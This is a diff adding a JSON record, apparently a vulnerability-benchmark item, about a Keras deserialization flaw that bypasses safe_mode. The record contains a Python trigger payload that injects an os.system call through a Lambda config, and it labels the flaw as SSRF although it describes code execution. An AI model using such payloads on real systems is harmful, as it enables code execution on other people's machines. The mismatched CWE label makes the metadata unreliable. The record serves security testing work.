@@ -1,0 +1,15 @@
+{
+  "file_id": "898_keras_issue_20751",
+  "numeric_id": "898",
+  "library_hint": "keras",
+  "source": "github_issue",
+  "title": "Bypassing Keras safe_mode for arbitrary code execution via deserialization",
+  "cve": "CVE-2025-1550",
+  "cwe": "CWE-918: Server-Side Request Forgery (SSRF)",
+  "library": "keras",
+  "affected_version": "prior to 3.8.0",
+  "vulnerable_function": "keras.src.saving.serialization_lib.deserialize_keras_object",
+  "triggerability": "indirect",
+  "trigger_payload": "import keras\nkeras.src.saving.serialization_lib.deserialize_keras_object({\"class_name\": \"Lambda\", \"config\": {\"function\": \"__import__('os').system('id')\"}})",
+  "oracle": "arbitrary code execution occurs when the deserialization process executes the injected function"
+}
